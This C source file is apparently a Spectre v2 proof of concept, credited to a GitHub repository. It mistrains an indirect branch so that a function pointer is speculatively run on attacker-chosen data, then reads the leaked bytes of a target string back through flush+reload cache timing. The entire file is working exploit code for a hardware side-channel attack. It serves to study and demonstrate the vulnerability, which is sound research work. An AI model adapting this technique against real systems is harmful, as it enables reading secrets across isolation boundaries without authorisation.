//! source: https://github.com/Anton-Cao/spectrev2-poc/
#include <stdint.h>
#include <x86intrin.h>
#include <stdio.h>
#include <string.h>

#include "../sidechannel/flush_reload.h"


#define CACHE_MISS 80
#define PAGESIZE 4096
int (*fp1)(char *info);
int (**fp2)(char *info);
char *probe_buf;
int junk;
//int results[256];

int attacker(char *info){
    return probe_buf[*info * PAGESIZE];
}

int safe(){
    return 42;
}

int victim(char *info, int input){
    static int result;
    for (int i =0; i < 100; i++){
        input += i;
        junk += input & i;
    }
    //_mm_mfence(); // removing the fence breaks attack???
    result = (*fp2)(info);

    return result;
}

void readMemoryByte(char *ctl, uint8_t value[2], int score[2]){
    int results[256]; // changing this from non-static to static changes the amount that the rsp is decremented, probably changing the outcome
    static int tries, i, j, k, mix_i;
    static char trash = '#';

    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }
    
    for (tries = 19; tries > 0; tries--){
        _mm_mfence();
        fp1 = &attacker;
        fp2 = &fp1;

        _mm_mfence();
        for (i = 0; i < 50; i++){
            junk ^= victim(&trash,0);
        }

        _mm_mfence();

        flush(probe_buf, PAGESIZE);
        _mm_mfence();
        
        fp1 = &safe;
        fp2 = &fp1;
        _mm_mfence();

        _mm_clflush((void*)fp1);
        _mm_clflush((void*)fp2);
        _mm_mfence();
        junk ^= victim(ctl,0);
        //junk ^= victim(&sec2,0);
        _mm_mfence();
        probe(probe_buf,80,PAGESIZE,results);
        // locate top two results
        _mm_mfence();
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if ((results[j] >= 2 * results[k] + 5) ||
            (results[j] == 2 && results[k] == 0)) {
            break;
        }
    }
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
}



void main(){
    char* target = "zoo";
    size_t malicious_x = 0;
    probe_buf = malloc(256 * PAGESIZE);
    memset(probe_buf, 1, 256*PAGESIZE);
    flush(probe_buf, PAGESIZE);

    //fp1 = malloc(sizeof(&attacker));
    //fp1 = malloc(sizeof(&fp2));

    int score[2], len = 3;
    uint8_t value[2];

    _mm_mfence();

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %d... ", malicious_x);
        readMemoryByte(target + malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0],
        (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
        if (score[1] > 0)
        printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
    }

    free(probe_buf);
}